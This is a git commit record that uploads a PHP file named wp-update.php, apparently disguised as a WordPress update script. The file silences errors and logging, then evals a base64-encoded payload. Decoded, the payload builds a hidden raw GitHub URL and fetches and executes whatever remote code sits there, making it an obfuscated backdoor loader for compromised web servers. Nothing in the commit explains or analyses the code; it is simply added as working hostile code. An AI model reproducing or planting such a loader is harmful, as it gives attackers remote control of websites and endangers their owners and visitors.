d5dadeaef985f575070ca683addb75e1d1e29fc5
unamexid <155900225+unamexid@users.noreply.github.com>
2024-05-12 21:45:59 +0630

    Add files via upload

---
+++ x/wp-update.php
@@ -0,0 +1,15 @@
+<?php 
+@set_time_limit(0);
+@ini_set('html_errors', '0');
+@clearstatcache();
+$d_17b31f50 = false;
+if ($d_17b31f50) {
+    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+    @ini_set('display_errors', '1');
+    @ini_set('log_errors', '1'); 
+} else {
+    error_reporting(0);
+    @ini_set('display_errors', '0');
+    @ini_set('log_errors', '0');
+}
+eval(base64_decode('CiBldmFsKHVybGRlY29kZSgiXDQ1XDYzXDE0Nlw0NVw2M1wxNDUiKSAuIGZpbGVfZ2V0X2NvbnRlbnRzKHVybGRlY29kZSgiXDE1MFwxNjRcMTY0XDE2MFwxNjNceDNhXDU3XHgyZlwxNjJceDYxXHg3N1x4MmVcMTQ3XHg2OVwxNjRcMTUwXDE2NVx4NjJcMTY1XHg3M1wxNDVceDcyXDE0M1x4NmZceDZlXHg3NFx4NjVceDZlXDE2NFx4MmVceDYzXHg2ZlwxNTVcNTdceDc1XHg2ZVx4NjFcMTU1XDE0NVwxNzBcMTUxXDE0NFw1N1wxNDNcMTU3XDE1NFwxNTRceDY1XDE0M1wxNjRcNTdcMTU1XDE0MVwxNTFcMTU2XHgyZlwxNzBcNTdceDY3XHg2NVx4NzRcNTVceDc1XHg3MFx4NjRceDYxXDE2NFx4NjVcNTZceDc0XHg3OFx4NzQiKSkpOyA=')); ?>
